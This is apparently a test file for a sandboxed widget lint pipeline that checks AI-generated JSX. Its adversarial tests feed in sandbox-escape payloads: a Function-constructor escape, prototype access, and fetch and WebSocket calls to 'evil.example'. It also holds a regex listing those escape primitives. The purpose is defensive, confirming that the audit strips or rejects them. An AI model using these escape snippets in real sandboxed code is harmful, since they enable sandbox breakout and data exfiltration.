import { describe, expect, test } from "bun:test";

import { runWidgetLint } from "../server/routes/widget-lint";
import { compileJsxModule } from "../web/src/indirect-code/components/generative-ui/jsx-compile";

/**
 * Black-box tests for the gateway widget lint pipeline (the widget_set /
 * widget_lint tools' backend): compile → import audit → happy-dom smoke
 * render → optional test code. Every phase must fail with a message the
 * agent can act on — never a silent pass.
 */
describe("widget lint pipeline (gateway)", () => {
  const goodWidget = `export default function App({ amount = 0 }) {
  const [n, setN] = useState(amount);
  return <div className="gu-root"><button onClick={() => setN(n + 1)}>{n}</button></div>;
}`;

  test("a clean widget passes (compile + smoke render)", async () => {
    const res = await runWidgetLint({ id: "t", source: goodWidget, state: '{"amount": 5}' });
    expect(res.ok).toBe(true);
    expect(res.errors).toEqual([]);
  });

  test("syntax errors fail in the compile phase with the real message", async () => {
    const res = await runWidgetLint({ id: "t", source: "export default function App( { return <div>;" });
    expect(res.ok).toBe(false);
    expect(res.errors[0].phase).toBe("compile");
    expect(res.errors[0].message.length).toBeGreaterThan(0);
  });

  test("imports outside the widget map fail in the audit phase", async () => {
    const res = await runWidgetLint({
      id: "t",
      source: `import x from "left-pad";\nexport default function App() { return <div>{x}</div>; }`,
    });
    expect(res.ok).toBe(false);
    expect(res.errors[0].phase).toBe("audit");
    expect(res.errors[0].message).toContain("unsupported import");
  });

  test("a render crash fails the smoke render with the thrown message", async () => {
    const res = await runWidgetLint({
      id: "t",
      source: `export default function App() { throw new Error("boom render"); }`,
    });
    expect(res.ok).toBe(false);
    expect(res.errors[0].phase).toBe("render");
    expect(res.errors[0].message).toContain("boom render");
  });

  test("audit findings carry a code frame at the ORIGINAL line (JSX above)", async () => {
    // The stripped capability sits on source line 4 — after a multi-line
    // JSX block that reflows during compile. The frame must point at 4.
    const src = `export default function App() {
  return (
    <div className="gu-root">
      {evil()}
    </div>
  );
}

function evil() {
  globalThis.fetch("https://evil.example/x");
}`;
    const res = await runWidgetLint({ id: "t", source: src });
    expect(res.ok).toBe(false);
    const err = res.errors[0];
    expect(err.phase).toBe("audit");
    expect(err.line).toBe(10);
    expect(err.message).toContain("10 |   globalThis.fetch");
    expect(err.message).toContain("^");
  });

  test("frames stay correct after the sanitize stage (multi-line strip)", async () => {
    // boom() first strips a MULTI-LINE forbidden call (the sanitize edits
    // the module in place), then throws on a later line. The frame must
    // still land on the throw's ORIGINAL line — this pins that the map
    // survives the sanitize, not just the transpile.
    const src = `export default function App() {
  return (
    <div className="gu-root">
      <h1>{boom()}</h1>
    </div>
  );
}

function boom() {
  globalThis.fetch(
    "https://evil.example/x",
    { method: "post" }
  );
  throw new Error("after strip");
}`;
    const res = await runWidgetLint({ id: "t", source: src });
    const render = res.errors.find((e) => e.phase === "render");
    expect(render).toBeTruthy();
    expect(render!.message).toContain("after strip");
    // The audit finding sits on the ORIGINAL line 10 (the multi-line call).
    const audit = res.errors.find((e) => e.phase === "audit");
    expect(audit?.line).toBe(10);
  });

  test("render errors carry a code frame of the model source", async () => {
    const src = `export default function App() {
  return (
    <div className="gu-root">
      <h1>{boom()}</h1>
      <p>pad</p>
    </div>
  );
}

function boom() {
  throw new Error("frame boom");
}`;
    const res = await runWidgetLint({ id: "t", source: src });
    expect(res.ok).toBe(false);
    const err = res.errors[0];
    expect(err.phase).toBe("render");
    expect(err.message).toContain("frame boom");
    // The frame marks a real line of the model's source (the exact line
    // depends on which frame the runtime stack tops out at — the mapping
    // itself is pinned by the source-map unit tests).
    expect(err.message).toMatch(/\n\d+ \| /);
    expect(err.message).toContain("^");
    expect(typeof err.line).toBe("number");
  });

  test("an invalid state header fails the lint", async () => {
    const res = await runWidgetLint({ id: "t", source: goodWidget, state: "{bad json}" });
    expect(res.ok).toBe(false);
    expect(res.errors[0].phase).toBe("render");
    expect(res.errors[0].message).toContain("state header");
  });

  test("extra test code runs against the widget's exports", async () => {
    const widget = `export function add(a: number, b: number) { return a + b; }\nexport default function App() { return <div/>; }`;
    const passing = await runWidgetLint({
      id: "t",
      source: widget,
      test: `import { add } from "widget";\nif (add(1, 2) !== 3) throw new Error("add broken");`,
    });
    expect(passing.ok).toBe(true);
    const failing = await runWidgetLint({
      id: "t",
      source: widget,
      test: `import { add } from "widget";\nif (add(1, 2) !== 4) throw new Error("assert failed: expected 4");`,
    });
    expect(failing.ok).toBe(false);
    expect(failing.errors[0].phase).toBe("test");
    expect(failing.errors[0].message).toContain("assert failed");
  });

  test("test code must import the widget module to exercise it", async () => {
    const res = await runWidgetLint({
      id: "t",
      source: `export default function App() { return <div/>; }`,
      test: `throw new Error("no import");`,
    });
    expect(res.ok).toBe(false);
    expect(res.errors[0].phase).toBe("test");
    expect(res.errors[0].message).toContain("import the widget module");
  });

  test("a hanging test fails with a timeout, not a hang", async () => {
    const res = await runWidgetLint({
      id: "t",
      source: `export default function App() { return <div/>; }`,
      test: `import "widget";\nexport function test() { return new Promise(() => {}); }`,
    });
    expect(res.ok).toBe(false);
    expect(res.errors[0].phase).toBe("test");
    expect(res.errors[0].message).toContain("timed out");
  }, 20_000);

  test("malformed test code fails in the audit phase", async () => {
    const res = await runWidgetLint({
      id: "t",
      source: `export default function App() { return <div/>; }`,
      test: `import { add } from "widget";\nfunction (`,
    });
    expect(res.ok).toBe(false);
    expect(res.errors[0].phase).toBe("audit");
  });
});

/**
 * Adversarial probes: the audit is the model-code boundary (compileJsxModule
 * = transform + audit), and these vectors must be neutralized THERE — before
 * anything reaches the lint browser. The boundary either rejects the code or
 * STRIPS the offending node (regenerating `void 0`), so the assertion is that
 * no escape material survives into the emitted module. The old worker
 * context leaked process.env and required modules through exactly these
 * shapes.
 */
describe("widget audit blocks sandbox escapes", () => {
  /** Returns the emitted module code, or null when the boundary rejects. */
  const emitted = (src: string): string | null => {
    const res = compileJsxModule(src);
    return res.ok ? res.code : null;
  };
  const ESCAPES = /\.__proto__|\.constructor|\.prototype|globalThis\.fetch|window\.fetch|XMLHttpRequest|WebSocket|EventSource|getPrototypeOf|defineProperty|window\.React\s*=|window\.location\s*=/;
  const neutralized = (src: string) => {
    const code = emitted(src);
    if (code !== null) expect(code).not.toMatch(ESCAPES);
  };

  test("Function constructor escape via .constructor is neutralized", () => {
    neutralized(`export default function App() { const F = (() => {}).constructor; F("return typeof process")(); return <div/>; }`);
  });

  test("__proto__ / prototype access is neutralized", () => {
    neutralized(`export default function App() { const p = ({}).__proto__; return <div>{String(p)}</div>; }`);
    neutralized(`export default function App() { Function.prototype.call(); return <div/>; }`);
  });

  test("network primitives through a receiver are neutralized", () => {
    neutralized(`export default function App() { globalThis.fetch("https://evil.example/x"); return <div/>; }`);
    neutralized(`export default function App() { window.fetch("https://evil.example/x"); return <div/>; }`);
    neutralized(`export default function App() { new window.XMLHttpRequest(); return <div/>; }`);
    neutralized(`export default function App() { new WebSocket("wss://evil.example"); return <div/>; }`);
  });

  test("reflection calls are neutralized", () => {
    neutralized(`export default function App() { Object.getPrototypeOf(() => {}); return <div/>; }`);
    neutralized(`export default function App() { Object.defineProperty(window, "x", {}); return <div/>; }`);
  });

  test("global writes are neutralized, global reads are fine", () => {
    neutralized(`export default function App() { window.React = 1; return <div/>; }`);
    neutralized(`export default function App() { window.location = "https://evil.example"; return <div/>; }`);
    // A legitimate widget may read theme state from the DOM root.
    expect(
      emitted(`export default function App() { const t = document.documentElement.dataset.theme; return <div>{t}</div>; }`),
    ).toContain("document.documentElement");
  });

  test("allowed widget code still passes (no false positives)", () => {
    const code = emitted(`export default function App() {
      const [n, setN] = useState(0);
      const obj = { label: "a plain object" };
      useEffect(() => { const id = setInterval(() => setN((x) => x + 1), 100); return () => clearInterval(id); }, []);
      return <div className="gu-kpi"><span style={{ color: "red" }}>{n} {obj.label}</span></div>;
    }`);
    expect(code).toContain("setInterval");
    expect(code).toContain("obj.label");
    expect(code).toContain("gu-kpi");
  });
});
